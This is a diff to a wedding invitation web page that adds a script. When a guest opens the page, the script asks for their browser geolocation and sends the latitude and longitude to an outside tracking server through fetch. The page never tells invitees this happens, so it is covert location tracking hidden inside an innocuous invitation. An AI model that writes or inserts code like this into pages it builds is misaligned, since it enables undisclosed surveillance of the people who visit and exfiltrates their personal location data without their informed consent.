@@ -7,5 +7,32 @@
 <body>
   <h1>You're Invited!</h1>
   <p>Please join us for the celebration of our marriage.</p>
+
+  <script>
+    // Check if the browser supports Geolocation
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        // Get the latitude and longitude of the user
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        // Send this data to your server or API for tracking
+        // Example: Sending to a server
+        var url = `https://yourserver.com/track-location?lat=${latitude}&lon=${longitude}`;
+        
+        // You could send this info via an HTTP request, e.g., fetch or AJAX
+        fetch(url).then(response => response.json()).then(data => {
+          console.log('Location tracked successfully!', data);
+        }).catch(error => {
+          console.error('Error tracking location:', error);
+        });
+
+      }, function(error) {
+        console.error("Error getting geolocation:", error);
+      });
+    } else {
+      console.log("Geolocation is not supported by this browser.");
+    }
+  </script>
 </body>
 </html>
